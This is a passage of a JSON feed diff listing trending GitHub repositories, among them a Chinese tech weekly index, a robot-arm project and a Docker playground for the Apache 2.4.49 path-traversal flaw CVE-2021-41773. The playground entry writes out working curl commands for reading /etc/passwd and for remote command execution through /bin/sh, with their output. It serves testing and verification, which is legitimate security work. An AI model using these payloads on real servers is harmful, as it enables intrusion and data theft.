-          "link": "https://github.com/ihciah/clean-dns-bpf",
-          "publishedOn": "2021-10-11T00:55:27.127Z",
-          "wordCount": 638,
-          "title": "ihciah/clean-dns-bpf"
-        },
-        {
-          "id": "https://github.com/ruanyf/weekly",
-          "author": null,
-          "description": "科技爱好者周刊，每周五发布\n\n科技爱好者周刊\n \n记录每周值得分享的科技内容，周五发布。\n \n欢迎投稿，推荐或自荐文章/软件/资源，请提交 issue 。\n \n \n \nP.S. 讨论区的《谁在招人》，是一个免费的程序员招聘帖，提供大量就业信息，欢迎访问或发布工作/实习岗位。\n \n \n如何搜索\n \n周刊已经沉淀了大量内容，可以使用下面的几种方法进行搜索。\n \n1、使用 GitHub 自带的网页搜索。\n \n2、使用 Sourcegraph.com 进行搜索。\n \n3、将这个仓库克隆到本地，然后在仓库目录使用下面的命令。\n \n$ grep -nri [搜索词] docs | cat --number\n\n \n比如，搜索 CSS 相关内容。\n \n$ grep -nri css docs | cat --number\n\n \n2021\n \n十月\n \n \n \n第 178 期：家庭太阳能发电的春天\n \n \n九月\n \n \n \n第 177 期：iPad 的真正用途\n \n \n第 176 期：中国法院承认 GPL 吗？\n \n \n第 175 期：知识广度 vs 知识深度\n \n \n第 174 期：全能程序员 vs 特长程序员\n \n \n八月\n \n \n \n第 173 期：网络收音机的设计\n \n \n第 172 期：我们会死于气候灾难吗？\n \n \n第 171 期：云服务流量有多贵？\n \n \n第 170 期：软件订阅制的胜利\n \n \n七月\n \n \n \n第 169 期：五菱汽车的产品设计\n \n \n第 168 期：游戏《底特律：变人》\n \n \n第 167 期：广告拦截器太过分了\n \n \n第 166 期：视频学习胜过读书吗？\n \n \n第 165 期：全端 App 的时代\n \n \n六月\n \n \n \n第 164 期：培训班 vs 大学，求职成功率比较\n \n \n第 163 期：你的城市有多少张病床？\n \n \n第 162 期：…",
-          "link": "https://github.com/ruanyf/weekly",
-          "publishedOn": "2021-10-11T00:55:27.086Z",
-          "wordCount": 983,
-          "title": "ruanyf/weekly"
-        },
-        {
-          "id": "https://github.com/blasty/CVE-2021-41773",
-          "author": null,
-          "description": "CVE-2021-41773 playground\n\nCVE-2021-41773 Playground\n \nThis is a small Docker recipe for setting up a Debian bookworm based container with an instance of the Apache HTTPd (2.4.49) that is vulnerable to CVE-2021-41773.\n \nCGI has been explicitly enabled so it can be used to test/verify Local file Disclosure behavior as well as Remote Command Execution behavior.\n \nUsage\n \n$ docker-compose build && docker-compose-up\n\n \nLocal file disclosure\n \n$ curl -s --path-as-is \"http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\nroot❌0:0:root:/root:/bin/bash\ndaemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin❌2:2:bin:/bin:/usr/sbin/nologin\nsys❌3:3:sys:/dev:/usr/sbin/nologin\nsync❌4:65534:sync:/bin:/bin/sync\ngames❌5:60:games:/usr/games:/usr/sbin/nologin\nman❌6:12👨/var/cache/man:/usr/sbin/nologin\nlp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail❌8:8:mail:/var/mail:/usr/sbin/nologin\nnews❌9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy❌13:13:proxy:/bin:/usr/sbin/nologin\nwww-data❌33:33:www-data:/var/www:/usr/sbin/nologin\nbackup❌34:34:backup:/var/backups:/usr/sbin/nologin\nlist❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc❌39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt❌100:65534::/nonexistent:/usr/sbin/nologin\n\n \nRemote Code Execution\n \n$ curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' \"http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
-          "link": "https://github.com/blasty/CVE-2021-41773",
-          "publishedOn": "2021-10-11T00:55:27.044Z",
-          "wordCount": 504,
-          "title": "blasty/CVE-2021-41773"
-        },
-        {
-          "id": "https://github.com/peng-zhihui/Dummy-Robot",
-          "author": null,
-          "description": "我的超迷你机械臂机器人项目。\n\nDummy-Robot\n \n我的超迷你机械臂机器人项目。\n \n资料待整理\n \n \n \n已添加3D模型设计源文件。",
-          "link": "https://github.com/peng-zhihui/Dummy-Robot",
-          "publishedOn": "2021-10-11T00:55:26.852Z",
-          "wordCount": 368,
-          "title": "peng-zhihui/Dummy-Robot"
         }
       ]
     }
